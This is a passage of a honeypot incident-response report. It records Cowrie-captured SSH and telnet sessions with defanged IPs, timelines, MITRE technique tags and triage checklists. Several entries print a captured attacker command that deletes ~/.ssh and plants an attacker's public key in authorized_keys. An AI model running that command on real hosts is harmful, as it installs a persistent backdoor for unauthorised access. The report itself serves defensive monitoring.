| **Source IP** | `203.116.129[.]55` |
| **First Seen** | 2026-07-10 19:57 |
| **Last Seen** | 2026-07-10 19:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:57:11` | `cowrie.session.connect` |
| `2026-07-10 19:57:11` | `cowrie.client.version` |
| `2026-07-10 19:57:12` | `cowrie.client.kex` |
| `2026-07-10 19:57:13` | `cowrie.login.success` |
| `2026-07-10 19:57:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.116.129[.]55` to AbuseIPDB if not already reported
- [ ] Block `203.116.129[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de402aac0a87

| Field | Detail |
|---|---|
| **Source IP** | `31.173.0[.]26` |
| **First Seen** | 2026-07-10 19:58 |
| **Last Seen** | 2026-07-10 19:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:58:16` | `cowrie.session.connect` |
| `2026-07-10 19:58:17` | `cowrie.client.version` |
| `2026-07-10 19:58:17` | `cowrie.client.kex` |
| `2026-07-10 19:58:18` | `cowrie.login.success` |
| `2026-07-10 19:58:19` | `cowrie.direct-tcpip.request` |
| `2026-07-10 19:58:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.173.0[.]26` to AbuseIPDB if not already reported
- [ ] Block `31.173.0[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e75d0de87dd1

| Field | Detail |
|---|---|
| **Source IP** | `69.126.144[.]30` |
| **First Seen** | 2026-07-10 19:58 |
| **Last Seen** | 2026-07-10 19:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:58:23` | `cowrie.session.connect` |
| `2026-07-10 19:58:24` | `cowrie.client.version` |
| `2026-07-10 19:58:24` | `cowrie.client.kex` |
| `2026-07-10 19:58:25` | `cowrie.login.success` |
| `2026-07-10 19:58:25` | `cowrie.direct-tcpip.request` |
| `2026-07-10 19:58:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.126.144[.]30` to AbuseIPDB if not already reported
- [ ] Block `69.126.144[.]30` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb85d6e37839

| Field | Detail |
|---|---|
| **Source IP** | `155.4.244[.]169` |
| **First Seen** | 2026-07-10 19:59 |
| **Last Seen** | 2026-07-10 19:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:59:03` | `cowrie.session.connect` |
| `2026-07-10 19:59:03` | `cowrie.client.version` |
| `2026-07-10 19:59:04` | `cowrie.client.kex` |
| `2026-07-10 19:59:04` | `cowrie.login.success` |
| `2026-07-10 19:59:05` | `cowrie.session.params` |
| `2026-07-10 19:59:05` | `cowrie.command.input` |
| `2026-07-10 19:59:05` | `cowrie.command.failed` |
| `2026-07-10 19:59:06` | `cowrie.log.closed` |
| `2026-07-10 19:59:07` | `cowrie.session.params` |
| `2026-07-10 19:59:07` | `cowrie.command.input` |
| `2026-07-10 19:59:07` | `cowrie.session.file_download` |
| `2026-07-10 19:59:07` | `cowrie.log.closed` |
| `2026-07-10 19:59:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `155.4.244[.]169` to AbuseIPDB if not already reported
- [ ] Block `155.4.244[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b0e569d8ded

| Field | Detail |
|---|---|
| **Source IP** | `155.4.244[.]169` |
| **First Seen** | 2026-07-10 19:59 |
| **Last Seen** | 2026-07-10 19:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:59:07` | `cowrie.session.connect` |
| `2026-07-10 19:59:07` | `cowrie.client.version` |
| `2026-07-10 19:59:07` | `cowrie.client.kex` |
| `2026-07-10 19:59:08` | `cowrie.login.success` |
| `2026-07-10 19:59:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `155.4.244[.]169` to AbuseIPDB if not already reported
- [ ] Block `155.4.244[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f320890f1f1d

| Field | Detail |
|---|---|
| **Source IP** | `155.4.244[.]169` |
| **First Seen** | 2026-07-10 19:59 |
| **Last Seen** | 2026-07-10 19:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:59:08` | `cowrie.session.connect` |
| `2026-07-10 19:59:08` | `cowrie.client.version` |
| `2026-07-10 19:59:09` | `cowrie.client.kex` |
| `2026-07-10 19:59:09` | `cowrie.login.success` |
| `2026-07-10 19:59:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `155.4.244[.]169` to AbuseIPDB if not already reported
- [ ] Block `155.4.244[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53f50243edc2

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-10 19:59 |
| **Last Seen** | 2026-07-10 19:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 19:59:23` | `cowrie.session.connect` |
| `2026-07-10 19:59:23` | `cowrie.client.version` |
| `2026-07-10 19:59:23` | `cowrie.client.kex` |
| `2026-07-10 19:59:25` | `cowrie.login.success` |
| `2026-07-10 19:59:26` | `cowrie.session.params` |
| `2026-07-10 19:59:26` | `cowrie.command.input` |
| `2026-07-10 19:59:27` | `cowrie.log.closed` |
| `2026-07-10 19:59:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce505d3576ce

| Field | Detail |
|---|---|
| **Source IP** | `159.255.34[.]139` |
| **First Seen** | 2026-07-10 20:00 |
| **Last Seen** | 2026-07-10 20:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:00:06` | `cowrie.session.connect` |
| `2026-07-10 20:00:07` | `cowrie.telnet.option` |
| `2026-07-10 20:00:08` | `cowrie.telnet.option` |
| `2026-07-10 20:00:17` | `cowrie.login.success` |
| `2026-07-10 20:00:17` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `159.255.34[.]139` to AbuseIPDB if not already reported
- [ ] Block `159.255.34[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04f00668732f

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-07-10 20:02 |
| **Last Seen** | 2026-07-10 20:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:02:19` | `cowrie.session.connect` |
| `2026-07-10 20:02:19` | `cowrie.client.version` |
| `2026-07-10 20:02:19` | `cowrie.client.kex` |
| `2026-07-10 20:02:20` | `cowrie.login.success` |
| `2026-07-10 20:02:21` | `cowrie.session.params` |
| `2026-07-10 20:02:21` | `cowrie.command.input` |
| `2026-07-10 20:02:21` | `cowrie.command.failed` |
| `2026-07-10 20:02:21` | `cowrie.log.closed` |
| `2026-07-10 20:02:22` | `cowrie.session.params` |
| `2026-07-10 20:02:22` | `cowrie.command.input` |
| `2026-07-10 20:02:22` | `cowrie.session.file_download` |
| `2026-07-10 20:02:22` | `cowrie.log.closed` |
| `2026-07-10 20:02:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-607788765b86

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-07-10 20:02 |
| **Last Seen** | 2026-07-10 20:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:02:22` | `cowrie.session.connect` |
| `2026-07-10 20:02:22` | `cowrie.client.version` |
| `2026-07-10 20:02:23` | `cowrie.client.kex` |
| `2026-07-10 20:02:23` | `cowrie.login.success` |
| `2026-07-10 20:02:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b63244f44786

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-07-10 20:02 |
| **Last Seen** | 2026-07-10 20:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:02:24` | `cowrie.session.connect` |
| `2026-07-10 20:02:24` | `cowrie.client.version` |
| `2026-07-10 20:02:24` | `cowrie.client.kex` |
| `2026-07-10 20:02:25` | `cowrie.login.success` |
| `2026-07-10 20:02:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f546062860f

| Field | Detail |
|---|---|
| **Source IP** | `134.209.186[.]182` |
| **First Seen** | 2026-07-10 20:02 |
| **Last Seen** | 2026-07-10 20:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:02:27` | `cowrie.session.connect` |
| `2026-07-10 20:02:27` | `cowrie.client.version` |
| `2026-07-10 20:02:27` | `cowrie.client.kex` |
| `2026-07-10 20:02:27` | `cowrie.login.success` |
| `2026-07-10 20:02:28` | `cowrie.session.params` |
| `2026-07-10 20:02:28` | `cowrie.command.input` |
| `2026-07-10 20:02:28` | `cowrie.command.failed` |
| `2026-07-10 20:02:28` | `cowrie.log.closed` |
| `2026-07-10 20:02:29` | `cowrie.session.params` |
| `2026-07-10 20:02:29` | `cowrie.command.input` |
| `2026-07-10 20:02:29` | `cowrie.session.file_download` |
| `2026-07-10 20:02:29` | `cowrie.log.closed` |
| `2026-07-10 20:02:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.209.186[.]182` to AbuseIPDB if not already reported
- [ ] Block `134.209.186[.]182` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6521d186688e

| Field | Detail |
|---|---|
| **Source IP** | `134.209.186[.]182` |
| **First Seen** | 2026-07-10 20:02 |
| **Last Seen** | 2026-07-10 20:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:02:29` | `cowrie.session.connect` |
| `2026-07-10 20:02:29` | `cowrie.client.version` |
| `2026-07-10 20:02:29` | `cowrie.client.kex` |
| `2026-07-10 20:02:30` | `cowrie.login.success` |
| `2026-07-10 20:02:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.209.186[.]182` to AbuseIPDB if not already reported
- [ ] Block `134.209.186[.]182` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5165e109e4a6

| Field | Detail |
|---|---|
| **Source IP** | `134.209.186[.]182` |
| **First Seen** | 2026-07-10 20:02 |
| **Last Seen** | 2026-07-10 20:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:02:30` | `cowrie.session.connect` |
| `2026-07-10 20:02:30` | `cowrie.client.version` |
| `2026-07-10 20:02:30` | `cowrie.client.kex` |
| `2026-07-10 20:02:30` | `cowrie.login.success` |
| `2026-07-10 20:02:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.209.186[.]182` to AbuseIPDB if not already reported
- [ ] Block `134.209.186[.]182` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecde92d560e5

| Field | Detail |
|---|---|
| **Source IP** | `65.20.174[.]49` |
| **First Seen** | 2026-07-10 20:03 |
| **Last Seen** | 2026-07-10 20:03 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:03:32` | `cowrie.session.connect` |
| `2026-07-10 20:03:34` | `cowrie.client.version` |
| `2026-07-10 20:03:34` | `cowrie.client.kex` |
| `2026-07-10 20:03:36` | `cowrie.login.success` |
| `2026-07-10 20:03:38` | `cowrie.direct-tcpip.request` |
| `2026-07-10 20:03:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.174[.]49` to AbuseIPDB if not already reported
- [ ] Block `65.20.174[.]49` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-692f5ded544f

| Field | Detail |
|---|---|
| **Source IP** | `223.197.153[.]143` |
| **First Seen** | 2026-07-10 20:03 |
| **Last Seen** | 2026-07-10 20:03 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:03:46` | `cowrie.session.connect` |
| `2026-07-10 20:03:47` | `cowrie.client.version` |
| `2026-07-10 20:03:47` | `cowrie.client.kex` |
| `2026-07-10 20:03:52` | `cowrie.login.success` |
| `2026-07-10 20:03:53` | `cowrie.direct-tcpip.request` |
| `2026-07-10 20:03:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.153[.]143` to AbuseIPDB if not already reported
- [ ] Block `223.197.153[.]143` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6eefeef68ac8

| Field | Detail |
|---|---|
| **Source IP** | `103.67.152[.]201` |
| **First Seen** | 2026-07-10 20:05 |
| **Last Seen** | 2026-07-10 20:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:05:11` | `cowrie.session.connect` |
| `2026-07-10 20:05:12` | `cowrie.client.version` |
| `2026-07-10 20:05:12` | `cowrie.client.kex` |
| `2026-07-10 20:05:14` | `cowrie.login.success` |
| `2026-07-10 20:05:15` | `cowrie.direct-tcpip.request` |
| `2026-07-10 20:05:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.152[.]201` to AbuseIPDB if not already reported
- [ ] Block `103.67.152[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90efeefa3182

| Field | Detail |
|---|---|
| **Source IP** | `122.166.253[.]226` |
| **First Seen** | 2026-07-10 20:05 |
| **Last Seen** | 2026-07-10 20:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:05:20` | `cowrie.session.connect` |
| `2026-07-10 20:05:21` | `cowrie.client.version` |
| `2026-07-10 20:05:21` | `cowrie.client.kex` |
| `2026-07-10 20:05:23` | `cowrie.login.success` |
| `2026-07-10 20:05:24` | `cowrie.direct-tcpip.request` |
| `2026-07-10 20:05:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.166.253[.]226` to AbuseIPDB if not already reported
- [ ] Block `122.166.253[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9dcd39621dbf

| Field | Detail |
|---|---|
| **Source IP** | `189.56.0[.]19` |
| **First Seen** | 2026-07-10 20:06 |
| **Last Seen** | 2026-07-10 20:07 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:06:49` | `cowrie.session.connect` |
| `2026-07-10 20:06:51` | `cowrie.client.version` |
| `2026-07-10 20:06:51` | `cowrie.client.kex` |
| `2026-07-10 20:06:54` | `cowrie.login.success` |
| `2026-07-10 20:06:56` | `cowrie.direct-tcpip.request` |
| `2026-07-10 20:07:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.56.0[.]19` to AbuseIPDB if not already reported
- [ ] Block `189.56.0[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76f09fdd0549

| Field | Detail |
|---|---|
| **Source IP** | `202.72.196[.]75` |
| **First Seen** | 2026-07-10 20:08 |
| **Last Seen** | 2026-07-10 20:13 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:08:33` | `cowrie.session.connect` |
| `2026-07-10 20:08:33` | `cowrie.client.version` |
| `2026-07-10 20:08:33` | `cowrie.client.kex` |
| `2026-07-10 20:08:36` | `cowrie.login.success` |
| `2026-07-10 20:08:36` | `cowrie.direct-tcpip.request` |
| `2026-07-10 20:13:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.72.196[.]75` to AbuseIPDB if not already reported
- [ ] Block `202.72.196[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8997d83e5ac

| Field | Detail |
|---|---|
| **Source IP** | `65.20.179[.]251` |
| **First Seen** | 2026-07-10 20:08 |
| **Last Seen** | 2026-07-10 20:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:08:43` | `cowrie.session.connect` |
| `2026-07-10 20:08:44` | `cowrie.client.version` |
| `2026-07-10 20:08:44` | `cowrie.client.kex` |
| `2026-07-10 20:08:45` | `cowrie.login.success` |
| `2026-07-10 20:08:46` | `cowrie.direct-tcpip.request` |
| `2026-07-10 20:08:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.179[.]251` to AbuseIPDB if not already reported
- [ ] Block `65.20.179[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8eb86fcd9cd8

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]254` |
| **First Seen** | 2026-07-10 20:16 |
| **Last Seen** | 2026-07-10 20:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:16:26` | `cowrie.session.connect` |
| `2026-07-10 20:16:27` | `cowrie.client.version` |
| `2026-07-10 20:16:27` | `cowrie.client.kex` |
| `2026-07-10 20:16:29` | `cowrie.login.success` |
| `2026-07-10 20:16:29` | `cowrie.direct-tcpip.request` |
| `2026-07-10 20:16:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]254` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]254` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bf80d9f2cc6

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-10 20:19 |
| **Last Seen** | 2026-07-10 20:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:19:14` | `cowrie.session.connect` |
| `2026-07-10 20:19:14` | `cowrie.client.version` |
| `2026-07-10 20:19:14` | `cowrie.client.kex` |
| `2026-07-10 20:19:15` | `cowrie.login.success` |
| `2026-07-10 20:19:16` | `cowrie.session.params` |
| `2026-07-10 20:19:16` | `cowrie.command.input` |
| `2026-07-10 20:19:16` | `cowrie.log.closed` |
| `2026-07-10 20:19:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-106de663c4e5

| Field | Detail |
|---|---|
| **Source IP** | `187.218.57[.]50` |
| **First Seen** | 2026-07-10 20:19 |
| **Last Seen** | 2026-07-10 20:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 20:19:27` | `cowrie.session.connect` |
| `2026-07-10 20:19:28` | `cowrie.client.version` |
| `2026-07-10 20:19:28` | `cowrie.client.kex` |
| `2026-07-10 20:19:29` | `cowrie.login.success` |
| `2026-07-10 20:19:30` | `cowrie.direct-tcpip.request` |
| `2026-07-10 20:19:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.218.57[.]50` to AbuseIPDB if not already reported
- [ ] Block `187.218.57[.]50` at perimeter firewall / security group
